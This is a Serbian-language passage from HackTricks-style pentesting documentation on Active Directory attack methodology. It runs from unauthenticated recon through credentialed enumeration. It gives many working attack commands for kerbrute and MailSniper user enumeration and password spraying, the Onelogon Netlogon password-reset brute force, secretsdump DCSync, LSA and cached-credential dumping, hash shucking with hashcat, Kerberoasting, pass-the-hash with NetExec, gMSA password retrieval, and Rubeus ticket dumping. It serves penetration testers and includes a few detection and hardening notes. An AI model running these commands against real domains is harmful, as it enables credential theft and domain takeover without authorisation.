# Active Directory metodologija

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja **network administratorima** omogućava efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** unutar mreže. Dizajniran je tako da može da se skalira, olakšavajući organizaciju velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura sistema **Active Directory** sastoji se od tri glavna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** predstavljaju grupe ovih domena povezane zajedničkom strukturom, dok **šuma** predstavlja kolekciju više stabala međusobno povezanih putem **trust relationships**, čineći najviši sloj organizacione strukture. Na svakom od ovih nivoa mogu se definisati posebna prava **pristupa** i **komunikacije**.

Ključni koncepti u okviru sistema **Active Directory** uključuju:

1. **Direktorijum** – Sadrži sve informacije koje se odnose na objekte sistema Active Directory.
2. **Objekat** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene foldere**.
3. **Domen** – Služi kao kontejner za objekte direktorijuma, pri čemu više domena može postojati unutar jednog **šuma**, a svaki domen održava sopstvenu kolekciju objekata.
4. **Stablo** – Grupa domena koji dele zajednički root domen.
5. **Šuma** – Najviši nivo organizacione strukture u sistemu Active Directory, sastavljen od nekoliko stabala sa međusobnim **trust relationships**.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa od ključnog značaja za centralizovano upravljanje i komunikaciju unutar mreže. Ovi servisi uključuju:

1. **Domain Services** – Centralizuje čuvanje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući funkcionalnosti **autentifikacije** i **pretrage**.
2. **Certificate Services** – Nadzire kreiranje, distribuciju i upravljanje bezbednim **digitalnim sertifikatima**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijum putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućava **single-sign-on** funkcionalnost za autentifikaciju korisnika u više web aplikacija tokom jedne sesije.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Od ključnog je značaja za razrešavanje **naziva domena**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro **razumete** proces **Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još ne znate kako funkcioniše.**](kerberos-authentication.md)

## Cheat Sheet

Mnogo informacija možete pronaći na adresi [https://wadcoms.github.io/](https://wadcoms.github.io), gde možete brzo videti koje komande možete pokrenuti za enumeraciju/eksploataciju AD-a.

> [!WARNING]
> Kerberos komunikacija obično **zahteva potpuno kvalifikovano ime domena (FQDN)** kako bi klijent mogao da dobije ticket za odgovarajući SPN. Pristup mašini putem IP adrese najčešće dovodi do korišćenja NTLM-a umesto Kerberosa.

## Recon Active Directory (bez kredencijala/sesija)

Ako imate pristup AD okruženju, ali nemate nikakve kredencijale/sesije, možete:

- **Pentestovati mrežu:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **iskoristite ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md)).
- Enumeracija DNS-a može pružiti informacije o ključnim serverima u domenu, kao što su web serveri, štampači, share-ovi, VPN, media serveri itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) da biste pronašli više informacija o tome kako se ovo radi.
- **Proverite null i Guest pristup SMB servisima** (ovo neće funkcionisati na modernim verzijama Windowsa):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerirajte LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonymous pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poisonujte mrežu**
- Prikupite kredencijale [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupite kredencijale **izlaganjem** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izvucite korisnička imena/imena iz internih dokumenata, društvenih mreža i servisa (uglavnom web servisa) unutar domenskih okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete pokušati različite AD **konvencije za korisnička imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog imena), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _nasumična slova i 3 nasumična broja_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledajte stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti **Kerberos error** kodom _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili odgovor sa **TGT-om u AS-REP-u** ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje na to da korisnik mora da izvrši pre-autentifikaciju.
- **No Authentication against MS-NRPC**: Korišćenje auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controllerima. Ova metoda poziva funkciju `DsrGetDcNameEx2` nakon povezivanja sa MS-NRPC interfejsom kako bi proverila da li korisnik ili računar postoje bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovaj tip enumeracije. Istraživanje je dostupno [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera u mreži, možete izvršiti i **enumeraciju korisnika nad njim**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom github repo-u**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom repozitorijumu ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena osoba koje rade u kompaniji** iz recon koraka koji je trebalo da obavite pre ovoga. Na osnovu imena i prezimena mogli biste da koristite skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje potencijalno validnih korisničkih imena.

### Zloupotreba allow-list-e ranjivog Netlogon kanala (Onelogon)

Čak i kada je **Zerologon** zakrpljen na DC-u, eksplicitno dozvoljeni nalozi i dalje mogu biti izloženi **legacy/vulnerable Netlogon secure-channel** ponašanju. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća registry vrednost **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL security descriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Bilo koji nalog ili grupa kojoj je dodeljen odgovarajući ACE u DACL-u može biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno dodaje **Everyone** na allow-list-u.

Praktičan workflow operatora:

1. **Identifikujte allow-listed principals** proverom i **SYSVOL/GPO** i **live DC registry-ja**.
2. **Razrešite SID-ove** pronađene u SDDL-u u stvarne AD korisnike/računare i dajte prioritet **DC machine accounts**, **trust accounts** i drugim privilegovanim mašinama.
3. Više puta pokušajte **MS-NRPC / Netlogon authentication** kao allow-listed nalog.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon password-setting** da resetujete lozinku ciljnog naloga (javni PoC je postavlja na prazan string).<sup>[[9]](#references)[[10]](#references)</sup>

Primeri za brzu trijažu / lab iz javnog artifact-a:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Napomene:

- **scanner** je koristan zato što efektivna allow-list može da se nalazi u **SYSVOL**-u, u **registry**-ju ili na oba mesta.
- Sama exploit putanja je važna zato što **ne zahteva Domain Admin privilegije** nakon identifikovanja ranjivog naloga.
- Kompromitovanje **Domain Controller machine account**-a, kao što je `DC$`, posebno je opasno zato što resetovanje te lozinke može direktno omogućiti šire putanje za **AD takeover**.
- Izvodljivost **brute-force** napada zavisi od režima: javno dostupni artifact opisuje meet-in-the-middle pristup, **24-bitni** brute force kada je dostupan drugi computer account i sporije **32-bitne** varijante.

Napomene o detekciji / hardening-u:

- Proverite allow-list policy i uklonite sve osim privremenih, izričito potrebnih compatibility exceptions.
- Nadgledajte DC **System** događaje **5827/5828/5829/5830/5831** da biste otkrili ranjive Netlogon connections koje su odbijene, otkrivene ili izričito dozvoljene policy-jem.
- Nalozi u `VulnerableChannelAllowList` tretirajte kao **high-risk** sve dok se legacy dependency ne ukloni.

### Poznavanje jednog ili više korisničkih imena

U redu, dakle znate da već imate validno korisničko ime, ali nemate lozinke... Zatim pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_, možete **zatražiti AS_REP poruku** za tog korisnika, koja će sadržati podatke šifrovane izvedenom vrednošću lozinke tog korisnika.
- [**Password Spraying**](password-spraying.md): Pokušajmo najčešće **lozinke** sa svakim od otkrivenih korisnika; možda neki korisnik koristi lošu lozinku (imajte na umu password policy!).
- Imajte na umu da možete vršiti **spray OWA servera** kako biste pokušali da dobijete pristup mail serverima korisnika.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **dobijete** određene challenge **hash-eve** tako što ćete izvršiti **poisoning** nekih protokola **mreže**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration pruža korisnička imena, email identifikatore i naming patterns, potencijalne hostove i servise koji mogu biti primorani da izvrše authentication. Iskoristite taj kontekst da biste identifikovali izvodljive NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) i potencijalne putanje ka AD okruženju.

### NetExec recon zasnovan na workspace-u i provere relay posture

- Koristite **`nxcdb` workspaces** da biste održavali stanje AD recon-a po engagement-u: `workspace create <name>` pokreće SQLite DB-jeve po protokolu u okviru `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaze pomoću `proto smb|mssql|winrm`, a prikupljene secrets izlistajte pomoću `creds`. Kada završite, ručno obrišite osetljive podatke: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Brzo otkrivanje subnet-a pomoću **`netexec smb <cidr>`** prikazuje **domain**, **OS build**, **SMB signing requirements** i **Null Auth**. Članovi koji prikazuju `(signing:False)` podložni su **relay** napadima, dok DC-ovi često zahtevaju signing.
- Generišite **hostnames u /etc/hosts** direktno iz NetExec output-a kako biste olakšali targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay to the DC blocked** zbog potpisivanja, ipak proverite stanje **LDAP**-a: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding podešavanje. DC koji zahteva SMB potpisivanje, ali ima onemogućeno LDAP potpisivanje, i dalje predstavlja validnu metu za **relay-to-LDAP** zloupotrebe kao što je **SPN-less RBCD**.

### Curenje akreditiva klijentskih štampača → masovna validacija domen akreditiva

- Web interfejsi štampača ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled izvornog koda/devtools alata može otkriti tekstualnu vrednost (npr. `<input value="<password>">`), što omogućava Basic-auth pristup repozitorijumima za skeniranje/štampanje.
- Preuzeti poslovi štampanja mogu sadržati **dokumente za onboarding u čistom tekstu** sa lozinkama po korisniku. Prilikom testiranja očuvajte uparivanja:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Ako možete da **pristupite drugim računarima ili share-ovima** koristeći **null ili guest user**, možete da **postavite fajlove** (kao što je SCF fajl) koji će, ako im se nekako pristupi, **pokrenuti NTLM autentikaciju prema vama**, tako da možete da **ukradete** **NTLM challenge** da biste ga crack-ovali:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidat za lozinku u drugim, sporijim formatima čiji se ključ direktno izvodi iz NT hash-a. Umesto brute-force napada na duge passphrase vrednosti u Kerberos RC4 ticket-ima, NetNTLM challenge-ovima ili cached credential-ima, prosleđujete NT hash-eve Hashcat NT-candidate modovima i dozvoljavate mu da proveri ponovnu upotrebu lozinke, a da nikada ne sazna plaintext. Ovo je posebno efikasno nakon kompromitovanja domena, kada možete da prikupite hiljade trenutnih i istorijskih NT hash-eva.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate NT korpus iz DCSync, SAM/SECURITY dump-ova ili credential vault-ova i potrebno je da proverite ponovnu upotrebu u drugim domenima/forest-ovima.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response-ove ili DCC/DCC2 blob-ove.
- Želite brzo da dokažete ponovnu upotrebu dugih, necrack-abilnih passphrase vrednosti i odmah izvršite pivot putem Pass-the-Hash.

Ova tehnika **ne funkcioniše** protiv encryption type-ova čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen zahteva samo AES, morate se vratiti na standardne password modove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristite `secretsdump.py` sa history opcijom da preuzmete najveći mogući skup NT hash-eva (i njihove prethodne vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History stavke značajno proširuju skup kandidata jer Microsoft može da čuva do 24 prethodna hash-a po nalogu. Za više načina za preuzimanje NTDS secrets pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) preuzima lokalne SAM/SECURITY podatke i cached domain logons (DCC/DCC2). Uklonite duplikate i dodajte te hash-eve u isti `nt_candidates.txt` spisak.
- **Track metadata** – Čuvajte username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex vrednosti). Podudarni hash-evi vam odmah govore koji principal ponovo koristi lozinku kada Hashcat prikaže pronađeni kandidat.
- Dajte prednost kandidatima iz istog forest-a ili trusted forest-a; to povećava verovatnoću preklapanja tokom shucking-a.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- NT-candidate input-i **moraju ostati neizmenjeni NT hash-evi od 32 hex karaktera**. Isključite rule engine-e (bez `-r`, bez hybrid modova) jer mangling kvari materijal ključa kandidata.
- Ovi modovi nisu sami po sebi brži, ali je NTLM keyspace (~30.000 MH/s na M3 Max) oko 100 puta brži od Kerberos RC4 (~300 MH/s). Testiranje odabrane NT liste je mnogo jeftinije od pretraživanja čitavog password space-a u sporom formatu.
- Uvek pokrenite **najnoviji Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) jer su modovi 31500/31600/35300/35400 nedavno dodati.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT mod za AS-REQ Pre-Auth, a AES etype-ovi (19600/19700) zahtevaju plaintext lozinku jer se njihovi ključevi izvode putem PBKDF2 iz UTF-16LE lozinki, a ne iz sirovih NT hash-eva.

#### Example – Kerberoast RC4 (mode 35300)

1. Uhvatite RC4 TGS za ciljni SPN koristeći user-a sa niskim privilegijama (pogledajte Kerberoast stranicu za detalje):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Izvršite shuck ticket-a koristeći svoju NT listu:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Podudaranje potvrđuje da service account koristi jedan od vaših postojećih NT hash-eva.

3. Odmah izvršite pivot putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Po potrebi kasnije možete povratiti plaintext pomoću `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Preuzmite cached logons sa kompromitovane workstation stanice:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju zanimljivog domain user-a u `dcc2_highpriv.txt` i izvršite shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno podudaranje daje NT hash koji je već poznat u vašoj listi, čime se dokazuje da cached user ponovo koristi lozinku. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM modu da biste povratili string.

Potpuno isti workflow važi za NetNTLM challenge-response vrednosti (`-m 27000/27100`) i DCC (`-m 31500`). Kada identifikujete podudaranje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo crack-ovati NT hash pomoću maski/rules offline.



## Enumerating Active Directory WITH credentials/session

Za ovu fazu morate da imate **kompromitovane credential-e ili session validnog domain account-a.** Ako imate validne credential-e ili shell kao domain user, **treba da zapamtite da su prethodno navedene opcije i dalje dostupne za kompromitovanje drugih user-a**.

Pre početka authenticated enumeration-a, upoznajte se sa **Kerberos double-hop problemom**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje naloga je **veliki korak ka proceni domena**, jer omogućava authenticated **Active Directory enumeration**:

Kada je reč o [**ASREPRoast**](asreproast.md), sada možete pronaći svakog potencijalno ranjivog user-a, a kada je reč o [**Password Spraying**](password-spraying.md), možete dobiti **spisak svih username-ova** i pokušati sa lozinkom kompromitovanog account-a, praznim lozinkama i novim obećavajućim lozinkama.

- Možete koristiti [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Takođe možete koristiti [**powershell for recon**](../basic-powershell-for-pentesters/index.html), što će biti stealthier
- Možete koristiti i [**use powerview**](../basic-powershell-for-pentesters/powerview.md) za izvlačenje detaljnijih informacija
- Još jedan odličan tool za recon u active directory-ju je [**BloodHound**](bloodhound.md). Nije **veoma stealthy** (u zavisnosti od collection metoda koje koristite), ali **ako vam to nije važno**, svakako bi trebalo da ga isprobate. Pronađite gde user-i mogu da koriste RDP, pronađite putanju do drugih grupa itd.
- **Ostali automated AD enumeration tool-ovi su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), jer mogu sadržati zanimljive informacije.
- **Tool sa GUI-jem** koji možete koristiti za enumeration direktorijuma jeste **AdExplorer.exe** iz **SysInternal** Suite-a.
- Takođe možete pretraživati LDAP bazu pomoću **ldapsearch** da biste pronašli credential-e u poljima _userPassword_ i _unixUserPassword_, pa čak i u polju _Description_. Pogledajte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristite **Linux**, možete takođe izvršiti enumeration domena pomoću [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete pokušati i sa automated tool-ovima kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Veoma je lako dobiti sve domain username-ove iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ovaj Enumeration odeljak deluje kratko, ovo je najvažniji deo. Otvorite linkove (uglavnom one za cmd, powershell, powerview i BloodHound), naučite kako da izvršite enumeration domena i vežbajte dok se ne budete osećali sigurno. Tokom assessment-a, ovo će biti ključni trenutak za pronalaženje načina do DA ili za odluku da se ništa ne može uraditi.

### Predictable pre-created computer accounts -> gMSA password access

Computer accounts pripremljeni za legacy join-ove mogu zadržati predvidljivu početnu lozinku. NetExec-ov `pre2k` module identifikuje karakterističnu vrednost `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i pokušava Kerberos TGT sa prvih 14 karaktera lowercase imena računara, bez završnog `$`. Tretirajte ovu UAC vrednost kao selector kandidata, umesto da pretpostavite da samo članstvo u **Pre-Windows 2000 Compatible Access** dokazuje da je lozinka slaba.<sup>[[18]](#references)[[20]](#references)</sup>

Koristite authenticated LDAP enumeration da testirate kandidate i sačuvate uspešne TGT-ove. `ALL=True` proširuje testiranje i na objekte sa vrednostima izvan podrazumevanog `4128` filtera.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Neuspešan podrazumevani/NTLM bind **ne poništava ovaj nalaz**: testirajte sa `-k`, FQDN-om koji se razrešava na DC i vremenom sinhronizovanim sa KDC-om. Uspešna izvršavanja modula upisuju liste kandidata i pribavljene ccache datoteke ispod `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nakon kompromitovanja computer principala, prikažite njegova ugnježdena članstva u grupama i izlazna prava. Posebno, principali navedeni u bezbednosnom deskriptoru `msDS-GroupMSAMembership` gMSA-a mogu da čitaju `msDS-ManagedPassword`; izlaz NetExec-a sa opcijom `--gmsa` prikazuje dozvoljene principale i vraća trenutni NT hash kada je autentifikujući computer ovlašćen.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Zatim procenite pronađeni gMSA kao bilo koji drugi credential: proverite članstvo u lokalnim/domain grupama, prava za logon, SPN-ove, delegaciju i dostupne servise pre nego što pokušate pass-the-hash. Ovaj ACL-based retrieval put razlikuje se od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), koji izvodi managed passwords nakon kompromitovanja KDS root-key-a.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS tickets** koje koriste servisi povezani sa user nalozima i njihovo crackovanje — enkripcija se zasniva na user passwordima — **offline**.

Više informacija o ovome:


{{#ref}}
kerberoast.md
{{#endref}}

### Udaljeno povezivanje (RDP, SSH, FTP, Win-RM itd.)

Kada pribavite neke credentials, možete proveriti da li imate pristup nekoj **mašini**. U tu svrhu možete koristiti **CrackMapExec** za pokušaj povezivanja na više servera različitim protokolima, u skladu sa vašim port scanovima.

### Local Privilege Escalation

Ako ste kompromitovali credentials ili imate sesiju kao regularni domain user i možete pristupiti **bilo kojoj mašini u domainu**, potražite put za **lokalnu eskalaciju privilegija i prikupljanje credentiala**. Lokalne administrator privilegije mogu omogućiti da **izdumpujete hash-eve drugih usera** iz memorije (LSASS) i lokalnog storage-a (SAM).

U ovoj knjizi postoji cela stranica o [**local privilege escalation u Windows-u**](../windows-local-privilege-escalation/index.html) i [**checklist-i**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Trenutni session ticketi

Veoma je **malo verovatno** da ćete pronaći **tickete** u trenutnom useru koji vam **daju dozvolu za pristup** neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Sa domain credentials ili korisničkom sesijom, ponovo isprobajte NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): authenticated enumeration i coercion techniques mogu otkriti relay putanje koje nisu bile dostupne tokom unauthenticated reconnaissance.

### Traženje Creds u Computer Shares | SMB Shares

Sada kada imate neke osnovne credentials, trebalo bi da proverite da li možete da **pronađete** neke **zanimljive fajlove koji se dele unutar AD-a**. To možete uraditi ručno, ali to je veoma dosadan repetitivan zadatak (a naročito ako pronađete stotine dokumenata koje treba proveriti).

[**Pratite ovaj link da biste saznali više o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete da **pristupite drugim računarima ili share-ovima**, možete da **postavite fajlove** (kao što je SCF fajl) koji će, ako im se na neki način pristupi, **pokrenuti NTLM authentication prema vama**, tako da možete da **ukradete** **NTLM challenge** i crack-ujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala svakom authenticated user-u da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation na Active Directory-ju SA privileged credentials/session

**Za sledeće tehnike regularni domain user nije dovoljan; potrebne su vam posebne privilegije/credentials za izvođenje ovih napada.**

### Izdvajanje hash-eva

